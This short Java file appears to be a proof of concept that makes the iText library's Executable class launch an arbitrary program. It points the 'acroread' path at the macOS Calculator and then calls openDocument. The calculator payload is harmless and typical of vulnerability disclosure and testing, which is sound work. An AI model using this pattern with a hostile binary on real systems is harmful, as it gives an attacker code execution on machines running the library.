package com.example;

import com.lowagie.tools.Executable;
import java.io.IOException;

public class Main {
    public static void main(String[] args) throws IOException {
        System.out.println("got it");
        Executable.acroread = "/System/Applications/Calculator.app/Contents/MacOS/Calculator";
        com.lowagie.tools.Executable.openDocument("\"",false);
    }
}